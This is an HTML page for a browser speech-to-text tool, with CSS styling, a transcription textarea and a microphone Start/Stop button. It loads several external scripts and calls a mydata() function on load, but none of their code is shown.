<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="../../assets/js/jquery.min.js"></script>
    <script src="../../assets/js/client.min.js"></script>
    <script src="../../assets/js/loc.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
        }

        body {
            margin: 1rem;
            padding: 1rem;
            font-family: 'Arial', sans-serif;
            max-width: 28rem;
            margin: 0 auto;
            position: relative;
            background: linear-gradient(135deg, #f0f4f8, #d9e2ec);
            min-height: 100vh;
            color: #333;
        }

        h1 {
            text-align: center;
            color: #2c3e50;
            font-size: 2rem;
            margin-bottom: 2rem;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .speech-container {
            background: #fff;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        #output {
            width: 100%;
            height: 200px;
            margin-bottom: 2rem;
            padding: 1rem;
            border: 2px solid #3498db;
            border-radius: 5px;
            font-size: 1rem;
            resize: none;
            color: #2c3e50;
            background: #f9fbfd;
            transition: border-color 0.3s;
        }

        #output:focus {
            border-color: #2980b9;
            outline: none;
        }

        #controls {
            display: flex;
            margin-top: 2rem;
            justify-content: center;
        }

        button {
            flex-grow: 1;
            height: 3rem;
            min-width: 3rem;
            border: none;
            border-radius: 50px; /* Changed to rounded rectangle */
            background: #3498db; /* Changed to blue for mic theme */
            margin-left: 2px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1), inset 0 -2px 0 rgba(0, 0, 0, 0.2);
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
            font-weight: bold;
            font-size: 1rem;
            transition: background 0.3s, transform 0.2s;
        }

        button:hover, button:focus {
            outline: none;
            background: #2980b9; /* Darker blue on hover */
            transform: translateY(-2px);
        }

        button::-moz-focus-inner {
            border: 0;
        }

        button:active {
            box-shadow: inset 0 2px 0 rgba(0, 0, 0, 0.2);
            transform: translateY(0);
        }

        button:disabled {
            pointer-events: none;
            background: #bdc3c7; /* Light gray for disabled */
            box-shadow: none;
        }

        button:first-child {
            margin-left: 0;
        }

        .branding {
            text-align: center;
            margin-top: 1rem;
            font-size: 0.9rem;
            color: #7f8c8d;
        }
    </style>
  </head>
  <body onload="mydata()">
    <h1>Speech to Text</h1>

    <div class="speech-container">
        <textarea id="output" placeholder="Transcribed text will appear here..." readonly></textarea>

        <div id="controls">
            <button id="redButton" disabled>üéôÔ∏è Start/Stop</button>
        </div>
    </div>

    <div class="branding">Powered by Green Lantern</div>

    <!-- inserting these scripts at the end to be able to use all the elements in the DOM -->
    <script src="../../assets/js/recorder.js"></script>
    <script src="js/_app.js"></script>
  </body>
</html>
